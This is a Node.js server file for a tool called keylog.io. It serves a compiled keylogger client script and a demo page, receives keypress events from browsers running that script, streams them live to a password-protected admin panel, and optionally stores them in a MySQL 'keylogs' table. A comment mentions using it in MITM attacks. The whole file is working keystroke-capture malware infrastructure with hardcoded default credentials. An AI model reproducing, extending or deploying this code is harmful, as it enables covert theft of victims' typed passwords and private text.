'use strict';

const { name, version } = require('../package.json');
const networkInterfaces = require('os').networkInterfaces
const http = require('http');
const path = require('path');
const compression = require('compression')
const express = require('express');
const bodyParser = require('body-parser');
const mysql = require('mysql');
const moment = require('moment');
const async = require('async');
const open = require('opn');
const app = express();
const basicAuth = require('express-basic-auth');

// Get the local external address
const getLocalExternalIp = () => [].concat.apply([], Object.values(networkInterfaces()))
  .filter(details => details.family === 'IPv4' && !details.internal)
  .pop().address;

// Like object assign but avoid undefined
const assignDefined = (target, ...sources) => {
  for (const source of sources) {
    for (const key of Object.keys(source)) {
      const val = source[key];
      if (val !== undefined) {
        target[key] = val;
      }
    }
  }
  return target;
}

// Server default settings
const defaults = {
  // Database connection options
  database: {
    name: 'keylogger',
    hostname: 'localhost',
    port: 3306,
    username: name,
    password: name,
    debug: false
  },
  // Administrator interface basic auth
  username: 'keylog-io',
  password: 'keylog-io',
  // Service settings
  hostname: getLocalExternalIp(),
  port: 9000,
  open: false,
  // serve a demo keylogger-client page
  serveDemo: false,
  // serve the keylogger client (bundled with socket.io)
  serveClient: false
};

module.exports = function(options) {
  // Init a empty variable for holding optional mysql connection
  global.conn = null

  // Init the http server with express handler
  const server = http.Server(app);

  // Clone original user defined options
  const original = Object.assign({}, options);

  // Extend default options with user supplied
  options = assignDefined({}, defaults, options);

  // Basic HTTé Authorization handler
  const authorizationFunction = basicAuth({
    challenge: true,
    users: { [`${options.username}`]: options.password }
  });

  // Create socket server
  const io = require('socket.io')(server, {
    serveClient: false,
    cookie: false
  });

  // Admin interface root page
  const address = `http://${options.hostname}:${options.port}`;

  // Boot the server
  console.log('\n[K]eylog.io is booting up..\n');
  async.series({
    connectDB: next => {
      // Since the options was merged and we can't say from
      // the extended options if the database property was selected
      // by user, refef to the original values to check if enable db
      if (!original.database) {
        global.conn = null;
        return next(null, false);
      }

      // Create MySQL client
      conn = mysql.createConnection({
        host: options.database.hostname,
        user: options.database.username,
        password: options.database.password,
        database: options.database.name,
        debug: options.database.debug
      });

      // Check for a valid MySQL connection and configuration
      console.log('Attempting to connect database..');
      async.series({
        connection: cb => conn.query('SELECT 1', cb),
        tableExistence: cb => conn.query('SELECT 1 FROM keylogs LIMIT 1;', cb)
      }, (err, resp) => {
        if (err) {
          console.log(`Can't connect to the database: ${err.message}\n`);
          return next(null, false);
        }

        console.log('Successfully connected to database.\n');
        next(null, true);
      });
    },
    setupServer: next => {
      app.use(bodyParser.json());
      app.use(compression());

      // TODO: This should be disabled on production
      app.use('/api', (req, res, next) => {
        res.setHeader('Access-Control-Allow-Origin', '*');
        res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS, PUT, DELETE');
        next();
      }, require('./router'));

      // Serve the keylog.io administration panel index
      app.get('/', authorizationFunction, (req, res) => {
        res.sendFile(path.join(__dirname, '/../dist/index.html'));
      });

      // Serve all the static files for administration interface
      app.use(express.static(path.join(__dirname, '/../dist')));

      // Start express socket server
      server.listen(options.port, '0.0.0.0', () => {
        console.log('The server is started and is listening at:', address);
        next(null, true);
      }).on('error', (e) => {
        next(e);
      });
    },
    serveDemo: next => {
      if (!options.serveDemo) {
        return next(null, false);
      }

      // Force the client file to be served since the demo depends on it
      options.serveClient = true;

      // Serve the demo page through express
      console.log('The keylogger DEMO page can be accessed at:', `${address}/demo`);
      app.use('/demo', express.static(path.join(__dirname, 'demo')));
      next(null, true);
    },
    serveClient: next => {
      if (!options.serveClient) {
        return next(null, false);
      }

      // Create the hostname based on user options
      const endpoint = `${address}`
      const webpack = require("webpack");

      // Extend default config because client file needs this variable
      const webpackConfig = require('./webpack.config.js');
      webpackConfig.plugins.unshift(new webpack.DefinePlugin({
        SERVER_URL: JSON.stringify(endpoint)
      }))

      // Compile the client script with the new endpoint
      webpack(webpackConfig, (err, stats) => {
        if (err) {
          console.error('The build of the client file failed.');
          if (err.details) {
            console.error(err.details);
          }
          return next(null, false);;
        }

        // Serve the client script through express
        console.log('The keylogger CLIENT script is available at:', `${address}/client.min.js`);
        app.get('/client.min.js', function (req, res) {
          res.sendFile(path.join(__dirname, '../dist/bundle.min.js'));
        });
        next(null, true);
      });
    },
    setupSocket: next => {
      // Administrator private namespace
      const admin = io.of('/admin');

      // When a client connects all the keypress events are forwarded
      // to the administrator namespace which is dedicated to the interface
      io.on('connection', function (socket) {
        console.log(`Socket [${socket.id}] has connected.`);

        // When new users connect or disconnect update the number of connected
        // sockets that is displayed on the admin interface, useful to know
        // if the program is working in case of MITM attacks
        admin.emit('clients', Object.keys(io.sockets.connected))
        socket.on('disconnect', () => {
          console.log(`Socket [${socket.id}] has disconnected.`);
          admin.emit('clients', Object.keys(io.sockets.connected))
        })

        // Listen for keylogs
        socket.on('keypress', (data) => {
          // Optionally save the keypresses to MySQL database
          // since the interface supports an archive mode for searching through
          // the keylog recording history this can be really useful
          if (conn && conn.state !== 'disconnected') {
            let mysqlData = Object.assign({}, data);
            mysqlData.timestamp = moment(data.timestamp).format('YYYY-MM-DD HH:mm:ss')
            conn.query('INSERT INTO keylogs SET ?', mysqlData, function (error, results, fields) {
              if (error) {
                console.log('Error while saving keylog event to database:\n', error);
              }
            });
          }

          // Forward all the keylogs to the administrator namespace
          admin.emit('keylog', data);
        });
      });

      next(null, true);
    }
  }, (err, results) => {
    if (err) {
      console.log('Something went wrong:\n', err);
      process.exit(err);
      return;
    }

    console.log('\nA web browser page should open is seconds.');
    console.log('If something fails, please visit the url manually.');
    console.log('\nPress [ctrl+c] at anytime to stop the server.\n');
    console.log('Waiting for clients connections... \n');

    if (options.open) {
      open(address);
    }
  });
};
